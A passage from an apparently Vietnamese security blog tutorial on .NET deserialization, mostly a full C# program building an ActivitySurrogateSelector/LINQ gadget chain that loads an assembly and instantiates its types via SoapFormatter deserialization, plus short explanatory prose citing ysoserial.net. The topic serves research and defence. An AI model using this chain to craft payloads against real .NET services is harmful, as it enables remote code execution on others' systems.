</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">pds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">verb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">dict</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">Hashtable</span> <span class="n">ht</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">verb</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FieldInfo</span> <span class="n">fi_keys</span> <span class="p">=</span> <span class="n">ht</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;buckets&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">Array</span> <span class="n">keys</span> <span class="p">=</span> <span class="p">(</span><span class="n">Array</span><span class="p">)</span><span class="n">fi_keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">FieldInfo</span> <span class="n">fi_key</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetElementType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">keys</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">object</span> <span class="n">bucket</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">object</span> <span class="n">key</span> <span class="p">=</span> <span class="n">fi_key</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="k">is</span> <span class="kt">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">fi_key</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">verb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fi_keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="n">keys</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Đoạn code trên dùng reflection để sửa giá trị của buckets field và replace the key là string với verb để 2 key trùng nhau ⇒ hash trùng nhau ⇒ lỗi sẽ trigger ⇒ trigger ToString như phân tích ở trên.</p>
<h3 id="4-systemwindowsformsaxhoststate-handling">4. <strong><strong>System.Windows.Forms.AxHost.State handling</strong></strong></h3>
<p>Ở phần trước ta thấy mọi thứ có vẻ hoàn hảo:</p>
<ul>
<li>Chúng ta đã tìm được cách trigger ToString() trong quá trình deserialize</li>
<li>Tìm được chain từ ToString() trigger Linq</li>
<li>Từ LINQ trigger malicious code.</li>
</ul>
<p>Bây giờ kết hợp mọi thứ lại và chạy kiểm tra</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.ComponentModel.Design</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Soap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Web.UI.WebControls</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">LinqBasic</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">MySurrogateSelector</span> <span class="p">:</span> <span class="n">SurrogateSelector</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">override</span> <span class="n">ISerializationSurrogate</span> <span class="n">GetSurrogate</span><span class="p">(</span><span class="n">Type</span> <span class="n">type</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">ISurrogateSelector</span> <span class="n">selector</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">selector</span> <span class="p">=</span> <span class="k">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(!</span><span class="n">type</span><span class="p">.</span><span class="n">IsSerializable</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Type</span> <span class="n">t</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="n">ISerializationSurrogate</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">base</span><span class="p">.</span><span class="n">GetSurrogate</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">selector</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="na">
</span></span></span><span class="line"><span class="cl"><span class="na">    [Serializable]</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">PayloadClass</span> <span class="p">:</span> <span class="n">ISerializable</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">GadgetChains</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Trace</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;In GetObjectData&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Build a chain to map a byte array to creating an instance of a class.</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// byte[] -&gt; Assembly.Load -&gt; Assembly -&gt; Assembly.GetType -&gt; Type[] -&gt; Activator.CreateInstance -&gt; Win!</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step 1</span>
</span></span><span class="line"><span class="cl">            <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;</span> <span class="n">data</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">[]&gt;();</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">File</span><span class="p">.</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">ExploitClass</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Location</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e1</span> <span class="p">=</span> <span class="n">data</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step 2</span>
</span></span><span class="line"><span class="cl">            <span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;</span> <span class="n">map_type</span> <span class="p">=</span> <span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;)</span><span class="n">Delegate</span><span class="p">.</span><span class="n">CreateDelegate</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Func</span><span class="p">&lt;</span><span class="n">Assembly</span><span class="p">,</span> <span class="n">IEnumerable</span><span class="p">&lt;</span><span class="n">Type</span><span class="p">&gt;&gt;),</span> <span class="k">typeof</span><span class="p">(</span><span class="n">Assembly</span><span class="p">).</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;GetTypes&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e2</span> <span class="p">=</span> <span class="n">e1</span><span class="p">.</span><span class="n">SelectMany</span><span class="p">(</span><span class="n">map_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// step 3</span>
</span></span><span class="line"><span class="cl">            <span class="kt">var</span> <span class="n">e3</span> <span class="p">=</span> <span class="n">e2</span><span class="p">.</span><span class="n">Select</span><span class="p">(</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// PagedDataSource maps an arbitrary IEnumerable to an ICollection</span>
</span></span><span class="line"><span class="cl">            <span class="n">PagedDataSource</span> <span class="n">pds</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PagedDataSource</span><span class="p">()</span> <span class="p">{</span> <span class="n">DataSource</span> <span class="p">=</span> <span class="n">e3</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// AggregateDictionary maps an arbitrary ICollection to an IDictionary </span>
</span></span><span class="line"><span class="cl">            <span class="c1">// Class is internal so need to use reflection.</span>
</span></span><span class="line"><span class="cl">            <span class="n">IDictionary</span> <span class="n">dict</span> <span class="p">=</span> <span class="p">(</span><span class="n">IDictionary</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="kt">int</span><span class="p">).</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Runtime.Remoting.Channels.AggregateDictionary&#34;</span><span class="p">),</span> <span class="n">pds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.</span>
</span></span><span class="line"><span class="cl">            <span class="n">DesignerVerb</span> <span class="n">verb</span> <span class="p">=</span> <span class="k">new</span> <span class="n">DesignerVerb</span><span class="p">(</span><span class="s">&#34;XYZ&#34;</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Need to insert IDictionary using reflection.</span>
</span></span><span class="line"><span class="cl">            <span class="k">typeof</span><span class="p">(</span><span class="n">MenuCommand</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;properties&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="n">verb</span><span class="p">,</span> <span class="n">dict</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Pre-load objects, this ensures they&#39;re fixed up before building the hash table.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">List</span><span class="p">&lt;</span><span class="kt">object</span><span class="p">&gt;</span> <span class="n">ls</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">object</span><span class="p">&gt;();</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">e3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">pds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">verb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">dict</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Hashtable</span> <span class="n">ht</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// Add two entries to table.</span>
</span></span><span class="line"><span class="cl">            <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">verb</span><span class="p">,</span> <span class="s">&#34;Hello&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ht</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s">&#34;Dummy&#34;</span><span class="p">,</span> <span class="s">&#34;Hello2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1">// reflection to change buckets</span>
</span></span><span class="line"><span class="cl">            <span class="n">FieldInfo</span> <span class="n">fi_keys</span> <span class="p">=</span> <span class="n">ht</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;buckets&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">Array</span> <span class="n">keys</span> <span class="p">=</span> <span class="p">(</span><span class="n">Array</span><span class="p">)</span><span class="n">fi_keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">FieldInfo</span> <span class="n">fi_key</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetElementType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;key&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="n">keys</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">object</span> <span class="n">bucket</span> <span class="p">=</span> <span class="n">keys</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="kt">object</span> <span class="n">key</span> <span class="p">=</span> <span class="n">fi_key</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="k">is</span> <span class="kt">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">fi_key</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">verb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">bucket</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">fi_keys</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">ht</span><span class="p">,</span> <span class="n">keys</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ls</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">BinaryFormatter</span> <span class="n">fmt1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MySurrogateSelector</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">ls</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">stm</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Trace</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;In GetObjectData&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//info.SetType(typeof(System.Windows.Forms.AxHost.State));</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//info.AddValue(&#34;PropertyBagBinary&#34;, GadgetChains());</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">Configuration</span><span class="p">.</span><span class="n">ConfigurationManager</span><span class="p">.</span><span class="n">AppSettings</span><span class="p">.</span><span class="n">Set</span><span class="p">(</span><span class="s">&#34;microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck&#34;</span><span class="p">,</span> <span class="s">&#34;true&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">SoapFormatter</span> <span class="n">fmt1</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">SoapFormatter</span> <span class="n">fmt2</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">PayloadClass</span> <span class="n">test</span> <span class="p">=</span> <span class="k">new</span> <span class="n">PayloadClass</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MySurrogateSelector</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//fmt1.Serialize(stm, test.GadgetChains());</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt1</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="n">test</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">stm</span><span class="p">.</span><span class="n">Seek</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">SeekOrigin</span><span class="p">.</span><span class="n">Begin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">fmt2</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2059.png"></p>
<p>Ôi Khoan!! có lỗi ở đây.</p>
<p>Đến thời điểm này tôi cũng không biết vì sao. Tuy nhiên, tôi thấy bộ công cụ nổi tiếng <a href="http://ysoserial.net">ysoserial.net</a> sử dụng <strong><strong>System.Windows.Forms.AxHost.State handling</strong></strong> để xử lý phần lỗi xảy ra ở chain này</p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2060.png"></p>
<p>Cụ thể, khi thêm phần handling của <strong><strong>System.Windows.Forms.AxHost.State:</strong></strong></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%2061.png"></p>
<ul>
